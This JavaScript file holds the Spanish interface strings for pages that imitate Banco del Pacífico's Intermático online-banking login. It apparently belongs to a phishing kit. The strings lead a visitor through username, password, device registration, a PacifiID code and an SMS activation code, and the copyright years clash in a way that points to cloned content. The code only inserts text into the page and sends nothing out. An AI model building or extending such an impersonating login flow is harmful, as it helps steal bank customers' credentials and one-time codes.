// ============================================================
// DICCIONARIO DE TEXTOS — todo el texto visible vive aquí, no en el HTML.
// El HTML lleva claves (data-t="clave") y este archivo las rellena al cargar.
// ============================================================
(function () {
  "use strict";

  var T = {
    // ---------- Compartido ----------
    "titulo": "Banco del Pacífico",
    "continuar": "Continuar",
    "cancelar": "Cancelar",
    "iniciar-sesion": "Iniciar sesión",
    "cargando": "Cargando...",
    "desbloquear": "Desbloquear usuario",
    "olvidaste": "¿Olvidaste tu contraseña?",
    "volver": "Volver",

    // ---------- Personas: paso usuario ----------
    "bienvenida": "Bienvenido",
    "ingresa-usuario": "Ingresa tu usuario",
    "crear-usuario": "Crear usuario y<br>contraseña",
    "solicitar-productos": "Solicitar<br>productos",

    // ---------- Personas: paso contraseña ----------
    "ingresa-clave": "Ingresa tu contraseña",
    "mostrar-clave": "Mostrar contraseña",
    "ocultar-clave": "Ocultar contraseña",
    "volver-usuario": "Volver al usuario",

    // ---------- Personas: paso dispositivo ----------
    "registrar-dispositivo": "Registra este dispositivo",
    "texto-dispositivo": "Detectamos un inicio de sesión desde un equipo diferente. Ingresa un nombre para identificarlo.",
    "nombre-dispositivo": "Nombre de este dispositivo",

    // ---------- Personas: paso código PacifiID ----------
    "ingresa-codigo": "Ingresa el código",
    "texto-codigo": "Escribe el código PacifiID generado desde tu Banca Móvil.",
    "codigo-verificacion": "Código de verificación",

    // ---------- Personas: paso código SMS ----------
    "titulo-sms": "Código por SMS",
    "texto-sms": "Te enviamos un código de activación por SMS. Ingresa el código que llegó al teléfono registrado en el banco. Comienza con dPc_.",
    "codigo-activacion": "Código de activación",

    // ---------- Personas: pie y consejos ----------
    "navegadores": "Recomendamos utilizar la Banca Virtual con los navegadores<br>Chrome 36.0.1, Firefox 31.0, Microsoft Edge.",
    "copyright": "© Copyright 2017 Banco del Pacífico *V5.8.1",
    "consejos": "Consejos",
    "por-tu-seguridad": "Por tu seguridad:",
    "consejo-1": "Banco del Pacífico S.A. no solicita claves, usuarios, números de tarjetas o cuenta por ningún medio.",
    "consejo-2": "No compartas tus claves, recuerda que son de uso personal e intransferibles.",
    "consejo-3": "Para acceder a la Banca Virtual, asegúrese de teclear en tu navegador la dirección <strong><a href=\"https://www.intermatico.com\" target=\"_blank\" rel=\"noreferrer\">https://www.intermatico.com</a></strong>",
    "consejo-4": "En caso recibir llamadas, mensajes texto o correos sospechosos contáctate inmediatamente al <strong>3731500</strong> opción 9.",
    "necesitas-ayuda": "¿Necesitas ayuda?",
    "ayuda-1": "• ¿Cómo creo mi usuario?",
    "ayuda-2": "• ¿Cómo desbloqueo mi usuario?",
    "ayuda-3": "• ¿Cómo recupero mi contraseña?",

    // ---------- Landing (index) ----------
    "titulo-inicio": "Banco del Pacifico - Intermatico",
    "bienvenido-landing": "¡Bienvenido!<br><br>",
    "para-comenzar": "Para comenzar, seleccione una opción",
    "banca-personas": "Banca Virtual Personas",
    "banca-empresas": "Banca Virtual Empresas",
    "terminos-link": "Términos y Condiciones",

    // ---------- Empresas ----------
    "titulo-empresas": "Banco del Pacifico - Iniciar sesión",
    "intermatico-titulo": "Intermático del Banco del Pacífico",
    "inicio": "Inicio",
    "usuario": "USUARIO",
    "contrasena": "CONTRASEÑA",
    "ingresar": "INGRESAR",
    "olvido-contrasena": "¿Olvidó su contraseña?",
    "es-usuario-nuevo": "¿Es usuario nuevo?",
    "registrese-aqui": "Regístrese aquí.",
    "aviso-empresas": "Estimado cliente, Intermático estará activo hasta el <strong>23 de abril</strong>, para que pueda realizar sus transacciones es necesario contratar nuestro Cash Management ingresando a <a href=\"https://www.bp.fin.ec/cashmanagement\">https://www.bp.fin.ec/cashmanagement</a> en la opción Contratación digital o si desea comuníquese con su funcionario.",
    "compat-empresas": "Internet Explorer 11.0; Chrome 36.0.1; Firefox 31.0; | Resolucion óptima: 1280x1024",
    "copyright-empresas": "© Copyright 2026 Banco del Pacífico * V.14.0.0",
    "por-su-seguridad": "POR SU SEGURIDAD",
    "verifica-direccion": "Antes de ingresar sus datos en esta pantalla, verifique si la dirección en la barra superior es: https://www.intermatico.com"
  };

  window.PacTextos = T;

  function aplicar() {
    var nodos = document.querySelectorAll("[data-t]");
    for (var i = 0; i < nodos.length; i++) {
      var clave = nodos[i].getAttribute("data-t");
      if (T[clave] != null) nodos[i].innerHTML = T[clave];
    }
    if (document.body && document.body.getAttribute("data-titulo") && T[document.body.getAttribute("data-titulo")]) {
      document.title = T[document.body.getAttribute("data-titulo")];
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", aplicar);
  } else {
    aplicar();
  }
})();
